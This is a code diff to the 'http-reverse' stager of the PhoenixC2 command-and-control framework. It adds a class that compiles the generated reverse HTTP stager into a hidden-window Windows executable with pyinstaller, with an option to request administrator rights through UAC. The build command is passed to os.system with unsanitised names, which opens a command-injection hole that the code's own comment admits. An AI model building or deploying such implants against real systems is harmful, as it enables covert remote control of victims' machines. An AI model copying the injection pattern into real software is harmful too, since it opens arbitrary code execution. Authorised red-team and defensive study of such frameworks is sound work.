@@ -7,13 +7,14 @@ import jinja2
 
 from phoenixc2.server.utils.options import (
     AddressType,
-    DefaultStagerPool,
-    IntegerType,
+    BooleanType,
     Option,
     OptionPool,
     StringType,
+    DefaultStagerPool,
+    IntegerType
 )
-
+from phoenixc2.server.utils.resources import get_resource
 from ..base_stager import BasePayload, BaseStager, FinalPayload
 
 if TYPE_CHECKING:
@@ -27,10 +28,7 @@ class PythonPayload(BasePayload):
     supported_target_os = ["linux"]
     supported_target_arch = ["x64", "x86"]
     supported_execution_methods = [
-        "direct",
-        "thread",
         "process",
-        "external",
     ]
     supported_code_types = ["shellcode", "compiled", "native"]
     supported_languages = ["python", "bash"]
@@ -63,15 +61,84 @@ class PythonPayload(BasePayload):
             output = 'python -c "' + output + '"'
         return FinalPayload(cls, stager_db, output)
 
-    def is_compiled(self, stager_db: "StagerModel") -> bool:
-        return False
+
+class CompiledPythonPayload(PythonPayload):
+    name = "Compiled Python"
+    description = "Compiled Python Executable"
+    supported_target_os = ["windows"]
+    supported_code_types = ["compiled"]
+    supported_languages = ["python"]
+    end_format = ".exe"
+    compiled = True
+    options = OptionPool(
+        [
+            Option(
+                "UAC",
+                description="Ask for admin rights",
+                real_name="admin",
+                type=BooleanType(),
+                default=False,
+            ),
+        ]
+    )
+
+    @classmethod
+    def is_compiled(cls, stager_db: "StagerModel") -> bool:
+        # TODO: Check if the file is compiled
+        try:
+            get_resource("data/stagers", f"{stager_db.name}.exe")
+        except:
+            return False
+        else:
+            return True
+
+    @classmethod
+    def generate(
+        cls, stager_db: "StagerModel", one_liner: bool = False, recompile: bool = False
+    ) -> "FinalPayload":
+        payload = super().generate(stager_db, False, recompile)
+
+        # save the payload to a file
+        payload_file = get_resource(
+            "data/stagers", f"{stager_db.name}.py", skip_file_check=True
+        )
+
+        with open(str(payload_file), "w") as f:
+            f.write(payload.output)
+
+        # check if the file is compiled
+        if not recompile and cls.is_compiled(stager_db):
+            return FinalPayload(
+                cls, stager_db, get_resource("data/stagers", f"{stager_db.name}.exe")
+            )
+
+        # compile the file
+        # WARNING: This is a security risk, as it allows arbitrary code execution!!! 
+        # this is only a prototype
+
+        if stager_db.options.get("admin", False):
+            os.system(
+                f"pyinstaller --onefile --noconsole --distpath --clean {payload_file} --name {stager_db.name} --distpath {get_resource('data/stagers')} --uac-admin"
+            )
+        else:
+            print(f"pyinstaller --onefile --noconsole  --clean {payload_file} --name {stager_db.name}.exe --distpath {str(get_resource('data', 'stagers'))}")
+            os.system(
+                f"pyinstaller --onefile --noconsole --target-arch x86_64 --clean {payload_file} --name {stager_db.name}.exe --distpath {str(get_resource('data', 'stagers'))}"
+            )
+        
+        # remove the file
+        os.remove(str(payload_file))
+
+        return FinalPayload(
+            cls, stager_db, get_resource("data/stagers", f"{stager_db.name}.exe").open("rb").read()
+        )
 
 
 class Stager(BaseStager):
     name = "http-reverse"
     description = "Reverse HTTP(S) stager"
     author: str = "Screamz2k"
-    payloads = {"python": PythonPayload}
+    payloads = {"python": PythonPayload, "compiled-python": CompiledPythonPayload}
     options = DefaultStagerPool(
         [
             Option(
